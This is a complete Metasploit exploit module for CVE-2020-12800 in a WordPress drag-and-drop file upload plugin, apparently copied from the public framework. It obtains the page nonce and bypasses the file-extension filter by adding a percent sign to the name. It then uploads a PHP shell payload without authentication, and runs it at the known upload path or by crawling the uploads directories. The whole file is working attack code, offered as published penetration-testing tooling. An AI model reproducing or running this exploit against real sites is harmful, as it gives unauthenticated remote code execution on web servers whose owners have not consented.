# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::FileDropper

  def initialize(info = {})
    super(
      update_info(
        info,
        &#039;Description&#039; => %q{
          This module exploits a file upload feature of Drag and Drop Multi File
          Upload - Contact Form 7 for versions prior to 1.3.4.  The allowed file
          extension list can be bypassed by appending a %, allowing for php
          shells to be uploaded.
          No authentication is required for exploitation.
        },
        &#039;License&#039; => MSF_LICENSE,
        &#039;Author&#039; =>
          [
            &#039;h00die&#039;, # msf module
            &#039;Austin Martin <amartin@amartinsec.com>&#039; # original PoC, discovery
          ],
        &#039;References&#039; =>
          [
            [&#039;EDB&#039;, &#039;48520&#039;],
            [&#039;CVE&#039;, &#039;2020-12800&#039;],
            [&#039;URL&#039;, &#039;https://github.com/amartinsec/CVE-2020-12800&#039;]
          ],
        &#039;Platform&#039; => [&#039;php&#039;],
        &#039;Privileged&#039; => false,
        &#039;Arch&#039; => ARCH_PHP,
        &#039;Targets&#039; =>
          [
            [ &#039;Automatic Target&#039;, {}]
          ],
        &#039;DisclosureDate&#039; => &#039;May 11 2020&#039;,
        &#039;DefaultTarget&#039; => 0,
        &#039;Notes&#039; => {
          &#039;Stability&#039; => [CRASH_SAFE],
          &#039;Reliability&#039; => [REPEATABLE_SESSION],
          &#039;SideEffects&#039; => [IOC_IN_LOGS, ARTIFACTS_ON_DISK]
        }
      )
    )
    register_options(
      [
        Opt::RPORT(80),
      ]
    )
  end

  # recursively search uploads folder(s) to find our payload
  def find_payload(path, payload_name)
    return unless @payload_location.nil?

    path = normalize_uri(target_uri.path, path)
    print_status("Checking #{path}")
    res = send_request_cgi(
      &#039;uri&#039; => path
    )
    unless res
      vprint_error(&#039;Server didnt respond when attempting to trigger payload&#039;)
      return
    end
    if res.body.include? payload_name
      print_good("Found payload: #{path}#{payload_name}")
      @payload_location = "#{path}#{payload_name}"
      return
    end

    # /a href="([\w\-\/]+)"/.match(res.body) do |url|
    res.body.scan(%r{a href="([\w\-/]+)"}) do |url|
      if url[0].start_with? &#039;/&#039;
        # skip it, its the parent directory
      elsif url[0].end_with? &#039;/&#039;
        find_payload("#{path}#{url[0]}", payload_name)
      end
    end
  end

  def check
    begin
      return check_plugin_version_from_readme(&#039;drag-and-drop-multiple-file-upload-contact-form-7&#039;, &#039;1.3.4&#039;, &#039;1&#039;)
    rescue ::Rex::ConnectionError
      vprint_error(&#039;Could not connect to the web service&#039;)
      return CheckCode::Unknown
    end
    CheckCode::Safe
  end

  def exploit
    vprint_status(&#039;Getting nonce&#039;)
    res = send_request_cgi(
      &#039;uri&#039; => normalize_uri(target_uri.path)
    )
    unless res
      fail_with(Failure::Unreachable, &#039;No server response&#039;)
    end

    if res.code != 200
      fail_with(Failure::UnexpectedReply, &#039;Non-200 response, check targeturi&#039;)
    end

    /ajax_nonce":"(?<nonce>.{10})"/ =~ res.body
    if nonce.nil?
      fail_with(Failure::UnexpectedReply, &#039;Nonce not found&#039;)
    end
    print_status("Nonce: #{nonce}")

    payload_name = "#{rand_text_alphanumeric(6..12)}.php"

    data = Rex::MIME::Message.new
    data.add_part(&#039;5242880&#039;, nil, nil, &#039;form-data; name="size_limit"&#039;)
    data.add_part(&#039;php%&#039;, nil, nil, &#039;form-data; name="supported_type"&#039;)
    data.add_part(&#039;dnd_codedropz_upload&#039;, nil, nil, &#039;form-data; name="action"&#039;)
    data.add_part(&#039;click&#039;, nil, nil, &#039;form-data; name="type"&#039;)
    data.add_part(nonce, nil, nil, &#039;form-data; name="security"&#039;)
    data.add_part(payload.encoded, &#039;text/plain&#039;, nil, "form-data; name=&#039;upload-file&#039;; filename=&#039;#{payload_name}%&#039;")

    # grab our valid cookie
    cookie = res.get_cookies

    vprint_status(&#039;Attempting payload upload&#039;)
    res = send_request_cgi(
      &#039;uri&#039; => normalize_uri(target_uri.path, &#039;wp-admin&#039;, &#039;admin-ajax.php&#039;),
      &#039;method&#039; => &#039;POST&#039;,
      &#039;cookie&#039; => cookie,
      &#039;ctype&#039; => "multipart/form-data; boundary=#{data.bound}",
      &#039;data&#039; => data.to_s
    )

    unless res
      fail_with(Failure::Unreachable, &#039;No server response&#039;)
    end

    if res.code == 403
      fail_with(Failure::UnexpectedReply, &#039;403 response, nonce detection failed&#039;)
    elsif res.code == 500
      fail_with(Failure::UnexpectedReply, &#039;500 response, server misconfigured, may need php-mbstring&#039;)
    end
    print_good(&#039;Payload uploaded successfully&#039;)
    register_file_for_cleanup(payload_name)

    # first we attempt to trigger the most obvious location of the payload.
    print_status(&#039;Attempting to trigger at well known location&#039;)
    res = send_request_cgi(
      &#039;uri&#039; => normalize_uri(target_uri.path, &#039;wp-content&#039;, &#039;uploads&#039;, &#039;wp_dndcf7_uploads&#039;, &#039;wpcf7-files&#039;, payload_name)
    )

    unless session_created?
      fail_with(Failure::Unreachable, &#039;No server response&#039;) unless res

      # dont need to check for 200, since that would have triggered our payload
      if res.code != 200
        print_status(&#039;Bruteforcing for payload to trigger&#039;)
        find_payload(normalize_uri(target_uri.path, &#039;wp-content&#039;, &#039;uploads&#039;, &#039;/&#039;), payload_name)
        unless @payload_location
          fail_with(Failure::Unknown, &#039;Unable to determine uploaded shell path&#039;)
        end
        # lastly, if we have a location found, trigger it
        send_request_cgi(&#039;uri&#039; => @payload_location)
      end
    end
  rescue ::Rex::ConnectionError
    fail_with(Failure::Unreachable, &#039;Could not connect to the web service&#039;)
  end
end

